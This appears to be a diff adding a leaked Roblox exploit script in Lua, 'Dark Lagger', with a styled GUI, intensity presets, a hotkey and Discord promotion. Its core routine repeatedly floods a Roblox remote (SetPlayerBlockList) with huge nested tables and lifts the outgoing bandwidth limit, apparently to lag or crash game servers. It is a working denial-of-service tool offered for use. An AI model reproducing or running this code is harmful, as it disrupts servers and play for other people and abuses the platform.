@@ -1,0 +1,434 @@
+-- leak by prince
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local HttpService = game:GetService("HttpService")
+
+local localPlayer = Players.LocalPlayer
+local configFileName = "DarkLaggerConfig.json"
+
+local presetSettings = {
+    LOW = { power = 100, wait = 0.8, kbps = 25000 },
+    MEDIUM = { power = 200, wait = 0.5, kbps = 50000 },
+    HIGH = { power = 270, wait = 0.3, kbps = math.huge },
+    ULTRA = { power = 289, wait = 0.1, kbps = math.huge },
+}
+
+local presetColors = {
+    LOW = Color3.fromRGB(55, 220, 100),
+    MEDIUM = Color3.fromRGB(245, 195, 50),
+    HIGH = Color3.fromRGB(230, 65, 65),
+    ULTRA = Color3.fromRGB(180, 60, 255),
+}
+
+local currentPreset = "MEDIUM"
+local triggerKey = Enum.KeyCode.T
+local isLaggerActive = false
+local lagThread = nil
+local isListeningForKey = false
+local ultraPulseThread = nil
+
+local function saveConfiguration()
+    pcall(function()
+        writefile(configFileName, HttpService:JSONEncode({
+            Preset = currentPreset,
+            Key = triggerKey.Name,
+        }))
+    end)
+end
+
+local function loadConfiguration()
+    local success, exists = pcall(function() return isfile and isfile(configFileName) end)
+    if not (success and exists) then return end
+    local success2, fileContent = pcall(function() return readfile(configFileName) end)
+    if not (success2 and fileContent and fileContent ~= "") then return end
+    local success3, data = pcall(function() return HttpService:JSONDecode(fileContent) end)
+    if not (success3 and data) then return end
+    if data.Preset and presetSettings[data.Preset] then currentPreset = data.Preset end
+    if data.Key then triggerKey = Enum.KeyCode[data.Key] or Enum.KeyCode.T end
+end
+loadConfiguration()
+
+local function performLagSpike(amount)
+    local masterTable = {}
+    local spamTable = {{}}
+    local currentReference = spamTable[1]
+    for _ = 1, amount do 
+        local newTable = {}
+        table.insert(currentReference, newTable)
+        currentReference = newTable
+    end
+    local maxIterations = math.min(499999 / (amount + 2), 1500)
+    for _ = 1, maxIterations do 
+        table.insert(masterTable, spamTable) 
+    end
+    pcall(function()
+        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(masterTable)
+    end)
+end
+
+local refreshToggleVisual
+local refreshPresetUI
+
+local function startLagger()
+    if lagThread then return end
+    isLaggerActive = true
+    lagThread = task.spawn(function()
+        while isLaggerActive do
+            local settings = presetSettings[currentPreset]
+            pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(settings.kbps) end)
+            performLagSpike(settings.power)
+            task.wait(settings.wait)
+        end
+    end)
+end
+
+local function stopLagger()
+    isLaggerActive = false
+    if lagThread then pcall(function() task.cancel(lagThread) end); lagThread = nil end
+end
+
+local function toggleLagger()
+    if isLaggerActive then stopLagger() else startLagger() end
+    if refreshToggleVisual then refreshToggleVisual() end
+end
+
+pcall(function() if CoreGui:FindFirstChild("DarkLaggerGui") then CoreGui.DarkLaggerGui:Destroy() end end)
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "DarkLaggerGui"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+if not pcall(function() screenGui.Parent = CoreGui end) then screenGui.Parent = localPlayer:WaitForChild("PlayerGui") end
+
+local colorBackground = Color3.fromRGB(13, 13, 15)
+local colorHeader = Color3.fromRGB(19, 19, 23)
+local colorRow = Color3.fromRGB(17, 17, 21)
+local colorBorder = Color3.fromRGB(48, 48, 58)
+local colorText = Color3.fromRGB(218, 218, 228)
+local colorDim = Color3.fromRGB(105, 105, 118)
+local colorGreen = Color3.fromRGB(65, 220, 120)
+
+local mainFrame = Instance.new("Frame", screenGui)
+mainFrame.Size = UDim2.new(0, 360, 0, 165)
+mainFrame.Position = UDim2.new(0.5, -180, 0.5, -83)
+mainFrame.BackgroundColor3 = colorBackground
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.ClipsDescendants = true
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)
+
+local mainStroke = Instance.new("UIStroke", mainFrame)
+mainStroke.Thickness = 2
+mainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+mainStroke.Color = presetColors[currentPreset]
+mainStroke.Transparency = 0.1
+
+local headerFrame = Instance.new("Frame", mainFrame)
+headerFrame.Size = UDim2.new(1, 0, 0, 38)
+headerFrame.BackgroundColor3 = colorHeader
+headerFrame.BorderSizePixel = 0
+Instance.new("UICorner", headerFrame).CornerRadius = UDim.new(0, 10)
+local headerFill = Instance.new("Frame", headerFrame)
+headerFill.Size = UDim2.new(1, 0, 0, 12)
+headerFill.Position = UDim2.new(0, 0, 1, -12)
+headerFill.BackgroundColor3 = colorHeader
+headerFill.BorderSizePixel = 0
+local headerLine = Instance.new("Frame", headerFrame)
+headerLine.Size = UDim2.new(1, 0, 0, 1)
+headerLine.Position = UDim2.new(0, 0, 1, -1)
+headerLine.BackgroundColor3 = colorBorder
+headerLine.BorderSizePixel = 0
+
+local titleLabel = Instance.new("TextLabel", headerFrame)
+titleLabel.Size = UDim2.new(0, 105, 1, 0)
+titleLabel.Position = UDim2.new(0, 14, 0, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "DARK LAGGER"
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.TextSize = 13
+titleLabel.TextColor3 = Color3.fromRGB(80, 160, 255)
+titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+titleLabel.ZIndex = 4
+
+task.spawn(function()
+    local timeElapsed = 0
+    while titleLabel and titleLabel.Parent do
+        timeElapsed = timeElapsed + 0.045
+        local r = math.clamp(55 + math.floor(math.sin(timeElapsed) * 55), 0, 255)
+        local g = math.clamp(130 + math.floor(math.sin(timeElapsed * 0.7) * 90), 0, 255)
+        local b = math.clamp(245 + math.floor(math.sin(timeElapsed * 1.3) * 10), 0, 255)
+        titleLabel.TextColor3 = Color3.fromRGB(r, g, b)
+        task.wait(0.05)
+    end
+end)
+
+local discordButton = Instance.new("TextButton", headerFrame)
+discordButton.Size = UDim2.new(0, 155, 1, 0)
+discordButton.Position = UDim2.new(0, 134, 0, 0)
+discordButton.BackgroundTransparency = 1
+discordButton.Text = "discord.gg/darkshubb"
+discordButton.TextColor3 = Color3.fromRGB(88, 152, 255)
+discordButton.Font = Enum.Font.Gotham
+discordButton.TextSize = 12
+discordButton.TextXAlignment = Enum.TextXAlignment.Left
+discordButton.AutoButtonColor = false
+discordButton.MouseButton1Click:Connect(function()
+    pcall(function() setclipboard("discord.gg/darkshubb") end)
+    local originalText = discordButton.Text
+    discordButton.Text = "copied!"
+    discordButton.TextColor3 = colorGreen
+    task.wait(1.2)
+    discordButton.Text = originalText
+    discordButton.TextColor3 = Color3.fromRGB(88, 152, 255)
+end)
+
+local function createHeaderButton(xOffset, text)
+    local button = Instance.new("TextButton", headerFrame)
+    button.Size = UDim2.new(0, 22, 0, 22)
+    button.Position = UDim2.new(1, xOffset, 0.5, -11)
+    button.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
+    button.BorderSizePixel = 0
+    button.Text = text
+    button.TextColor3 = colorText
+    button.Font = Enum.Font.GothamBold
+    button.TextSize = 13
+    button.AutoButtonColor = false
+    button.ZIndex = 5
+    Instance.new("UICorner", button).CornerRadius = UDim.new(0, 5)
+    local stroke = Instance.new("UIStroke", button)
+    stroke.Color = colorBorder
+    stroke.Transparency = 0.35
+    stroke.Thickness = 1
+    return button
+end
+
+local minimizeButton = createHeaderButton(-52, "–")
+local closeButton = createHeaderButton(-26, "✕")
+closeButton.MouseButton1Click:Connect(function() screenGui:Destroy() end)
+
+local bodyFrame = Instance.new("Frame", mainFrame)
+bodyFrame.Size = UDim2.new(1, -18, 1, -50)
+bodyFrame.Position = UDim2.new(0, 9, 0, 44)
+bodyFrame.BackgroundColor3 = colorRow
+bodyFrame.BorderSizePixel = 0
+Instance.new("UICorner", bodyFrame).CornerRadius = UDim.new(0, 8)
+local bodyStroke = Instance.new("UIStroke", bodyFrame)
+bodyStroke.Color = colorBorder
+bodyStroke.Transparency = 0.45
+bodyStroke.Thickness = 1
+
+local statusDot = Instance.new("Frame", bodyFrame)
+statusDot.Size = UDim2.new(0, 8, 0, 8)
+statusDot.Position = UDim2.new(0, 14, 0, 16)
+statusDot.BackgroundColor3 = presetColors[currentPreset]
+statusDot.BorderSizePixel = 0
+Instance.new("UICorner", statusDot).CornerRadius = UDim.new(1, 0)
+
+local statusLabel = Instance.new("TextLabel", bodyFrame)
+statusLabel.Size = UDim2.new(0, 120, 0, 14)
+statusLabel.Position = UDim2.new(0, 14, 0, 30)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = "INACTIVE"
+statusLabel.TextColor3 = colorDim
+statusLabel.Font = Enum.Font.GothamBold
+statusLabel.TextSize = 10
+statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+local toggleSwitch = Instance.new("TextButton", bodyFrame)
+toggleSwitch.Size = UDim2.new(0, 46, 0, 24)
+toggleSwitch.Position = UDim2.new(1, -58, 0, 12)
+toggleSwitch.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
+toggleSwitch.Text = ""
+toggleSwitch.BorderSizePixel = 0
+toggleSwitch.AutoButtonColor = false
+Instance.new("UICorner", toggleSwitch).CornerRadius = UDim.new(1, 0)
+local switchStroke = Instance.new("UIStroke", toggleSwitch)
+switchStroke.Color = colorBorder
+switchStroke.Transparency = 0.35
+switchStroke.Thickness = 1
+
+local switchBall = Instance.new("Frame", toggleSwitch)
+switchBall.Size = UDim2.new(0, 18, 0, 18)
+switchBall.Position = UDim2.new(0, 3, 0.5, -9)
+switchBall.BackgroundColor3 = Color3.fromRGB(115, 115, 128)
+switchBall.BorderSizePixel = 0
+Instance.new("UICorner", switchBall).CornerRadius = UDim.new(1, 0)
+
+refreshToggleVisual = function()
+    if isLaggerActive then
+        statusLabel.Text = "ACTIVE"
+        statusLabel.TextColor3 = colorGreen
+        TweenService:Create(switchBall, TweenInfo.new(0.18), {
+            Position = UDim2.new(1, -21, 0.5, -9),
+            BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+        }):Play()
+        TweenService:Create(toggleSwitch, TweenInfo.new(0.18), {
+            BackgroundColor3 = Color3.fromRGB(35, 58, 45),
+        }):Play()
+        switchStroke.Color = colorGreen
+    else
+        statusLabel.Text = "INACTIVE"
+        statusLabel.TextColor3 = colorDim
+        TweenService:Create(switchBall, TweenInfo.new(0.18), {
+            Position = UDim2.new(0, 3, 0.5, -9),
+            BackgroundColor3 = Color3.fromRGB(115, 115, 128),
+        }):Play()
+        TweenService:Create(toggleSwitch, TweenInfo.new(0.18), {
+            BackgroundColor3 = Color3.fromRGB(22, 22, 28),
+        }):Play()
+        switchStroke.Color = colorBorder
+    end
+end
+
+toggleSwitch.MouseButton1Click:Connect(toggleLagger)
+
+local presetButtons = {}
+local keyButton
+
+local function createPresetButton(label, xPos, width)
+    local btn = Instance.new("TextButton", bodyFrame)
+    btn.Size = UDim2.new(0, width, 0, 28)
+    btn.Position = UDim2.new(0, xPos, 1, -36)
+    btn.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
+    btn.Text = label
+    btn.TextColor3 = colorDim
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 11
+    btn.BorderSizePixel = 0
+    btn.AutoButtonColor = false
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+    local stroke = Instance.new("UIStroke", btn)
+    stroke.Color = colorBorder
+    stroke.Transparency = 0.5
+    stroke.Thickness = 1
+    return btn
+end
+
+local btnLow = createPresetButton("LOW", 8, 58)
+local btnMed = createPresetButton("MEDIUM", 71, 72)
+local btnHigh = createPresetButton("HIGH", 148, 58)
+local btnUltra = createPresetButton("ULTRA", 211, 66)
+keyButton = createPresetButton("KEY: " .. triggerKey.Name, 282, 74)
+
+presetButtons = { LOW = btnLow, MEDIUM = btnMed, HIGH = btnHigh, ULTRA = btnUltra }
+
+local function stopUltraPulse()
+    if ultraPulseThread then
+        pcall(function() task.cancel(ultraPulseThread) end)
+        ultraPulseThread = nil
+    end
+end
+
+local function startUltraPulse()
+    stopUltraPulse()
+    ultraPulseThread = task.spawn(function()
+        local t = 0
+        while mainStroke and mainStroke.Parent do
+            t = t + 0.06
+            local r = math.clamp(160 + math.floor(math.sin(t) * 60), 0, 255)
+            local g = math.clamp(20 + math.floor(math.sin(t * 0.6) * 20), 0, 255)
+            local b = math.clamp(240 + math.floor(math.sin(t * 1.4) * 15), 0, 255)
+            mainStroke.Color = Color3.fromRGB(r, g, b)
+            statusDot.BackgroundColor3 = Color3.fromRGB(r, g, b)
+            mainStroke.Thickness = 2 + math.abs(math.sin(t * 1.2)) * 1.5
+            task.wait(0.05)
+        end
+    end)
+end
+
+refreshPresetUI = function()
+    local activeColor = presetColors[currentPreset]
+    if currentPreset ~= "ULTRA" then
+        stopUltraPulse()
+        mainStroke.Thickness = 2
+    end
+    for name, btn in pairs(presetButtons) do
+        local isActive = (name == currentPreset)
+        local color = presetColors[name]
+        local r = math.floor(color.R * 255)
+        local g = math.floor(color.G * 255)
+        local b = math.floor(color.B * 255)
+        TweenService:Create(btn, TweenInfo.new(0.15), {
+            BackgroundColor3 = isActive and Color3.fromRGB(math.floor(r * 0.12), math.floor(g * 0.12), math.floor(b * 0.12)) or Color3.fromRGB(26, 26, 32),
+        }):Play()
+        btn.TextColor3 = isActive and color or colorDim
+        local stroke = btn:FindFirstChildOfClass("UIStroke")
+        if stroke then
+            stroke.Color = isActive and color or colorBorder
+            stroke.Transparency = isActive and 0.1 or 0.5
+            stroke.Thickness = isActive and 1.5 or 1
+        end
+    end
+    if currentPreset == "ULTRA" then
+        startUltraPulse()
+    else
+        TweenService:Create(mainStroke, TweenInfo.new(0.2), { Color = activeColor }):Play()
+        TweenService:Create(statusDot, TweenInfo.new(0.2), { BackgroundColor3 = activeColor }):Play()
+    end
+end
+
+btnLow.MouseButton1Click:Connect(function() currentPreset = "LOW"; refreshPresetUI(); saveConfiguration() end)
+btnMed.MouseButton1Click:Connect(function() currentPreset = "MEDIUM"; refreshPresetUI(); saveConfiguration() end)
+btnHigh.MouseButton1Click:Connect(function() currentPreset = "HIGH"; refreshPresetUI(); saveConfiguration() end)
+btnUltra.MouseButton1Click:Connect(function() currentPreset = "ULTRA"; refreshPresetUI(); saveConfiguration() end)
+keyButton.MouseButton1Click:Connect(function()
+    isListeningForKey = true
+    keyButton.Text = "KEY: ..."
+    keyButton.TextColor3 = Color3.fromRGB(88, 152, 255)
+end)
+
+refreshPresetUI()
+refreshToggleVisual()
+
+local isMinimized = false
+minimizeButton.MouseButton1Click:Connect(function()
+    isMinimized = not isMinimized
+    bodyFrame.Visible = not isMinimized
+    minimizeButton.Text = isMinimized and "+" or "–"
+    TweenService:Create(mainFrame, TweenInfo.new(0.18, Enum.EasingStyle.Quart), {
+        Size = isMinimized and UDim2.new(0, 360, 0, 38) or UDim2.new(0, 360, 0, 165)
+    }):Play()
+end)
+
+local isDragging = false
+local dragStartInput, dragStartPosition
+headerFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        isDragging = true
+        dragStartInput = input.Position
+        dragStartPosition = mainFrame.Position
+        input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then isDragging = false end end)
+    end
+end)
+UserInputService.InputChanged:Connect(function(input)
+    if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and dragStartInput then
+        local delta = input.Position - dragStartInput
+        mainFrame.Position = UDim2.new(dragStartPosition.X.Scale, dragStartPosition.X.Offset + delta.X, dragStartPosition.Y.Scale, dragStartPosition.Y.Offset + delta.Y)
+    end
+end)
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then isDragging = false end
+end)
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if isListeningForKey then
+        if input.KeyCode and input.KeyCode ~= Enum.KeyCode.Unknown then
+            triggerKey = input.KeyCode
+            keyButton.Text = "KEY: " .. triggerKey.Name
+            keyButton.TextColor3 = colorDim
+            isListeningForKey = false
+            saveConfiguration()
+        end
+        return
+    end
+    if input.KeyCode == triggerKey then toggleLagger() end
+    if input.KeyCode == Enum.KeyCode.LeftControl then mainFrame.Visible = not mainFrame.Visible end
+end)
+
+print("[Dark Lagger] loaded")
+print("LEKAD BY FRNK33.")
+print("discord.gg/kastorhub")
